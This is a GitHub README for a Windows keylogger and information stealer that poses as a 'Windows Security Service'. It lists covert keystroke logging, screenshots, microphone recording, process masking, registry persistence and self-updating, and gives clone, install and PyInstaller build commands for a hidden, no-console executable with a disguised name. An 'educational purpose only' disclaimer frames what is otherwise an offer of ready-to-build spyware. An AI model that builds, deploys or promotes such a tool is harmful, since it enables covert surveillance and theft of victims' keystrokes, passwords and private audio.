# 🕵️ Advanced Security Service (Stealth Keylogger)

[![Python](https://img.shields.io/badge/Python-3.8%2B-blue?style=for-the-badge&logo=python)](https://www.python.org/)
[![License](https://img.shields.io/badge/License-MIT-green?style=for-the-badge)](LICENSE)
[![Platform](https://img.shields.io/badge/Platform-Windows-lightgrey?style=for-the-badge&logo=windows)](https://www.microsoft.com/windows/)

A powerful, stealthy keylogger and information stealer masquerading as a legitimate **Windows Security Service**. It features a futuristic "JARVIS-style" startup overlay to blend in with system operations.

> [!CAUTION]
> **EDUCATIONAL PURPOSE ONLY.**
> Usage of this tool for attacking targets without prior mutual consent is illegal. Developers assume no liability for misuse.

## 🚀 New Features (v2.5)

### 🤖 JARVIS Startup Overlay
*   **Visuals:** A high-fidelity, glowing cyan HUD appears on startup.
*   **Data:** Displays real-time **CPU**, **RAM**, and **Battery** stats with "System Initialization" animations.
*   **Stealth:** Fades out after 10 seconds, leaving the keylogger running silently in the background.

### � Core Surveillance
*   **Keystroke Logging:** Records every key pressed.
*   **Smart Screenshots:** Captures JPEG screenshots on active window changes (Saved to `%TEMP%` to avoid permissions errors).
*   **Audio Recording:** Records microphone clips.

### 🛡️ Stealth & Engineering
*   **Process Masking:** Renamed to `SecurityService.exe`.
*   **Persistence:** Adds itself to Windows Startup Registry.
*   **Auto-Update:** Self-updates from this GitHub repository.

## 📦 Installation & Usage

1.  **Clone the Repository**
    ```bash
    git clone https://github.com/Pranavfr/keylogger-advanced.git
    cd keylogger-advanced
    ```

2.  **Install Dependencies**
    ```bash
    pip install -r requirements.txt
    ```

3.  **Build Executable**
    To compile the stealth executable with the overlay:
    ```bash
    python -m PyInstaller --noconsole --onefile --name StarkCoreServices --icon=app_icon.ico --hidden-import PyQt5 --collect-submodules Crypto --hidden-import requests --copy-metadata pycryptodomex security_service.py
    ```
    The output file will be in the `dist` folder.

## ⚠️ Legal Disclaimer
This project is intended for security research and educational purposes only.


## 👤 Author
*   **Pranav** - [@pranavfr](https://github.com/pranavfr)
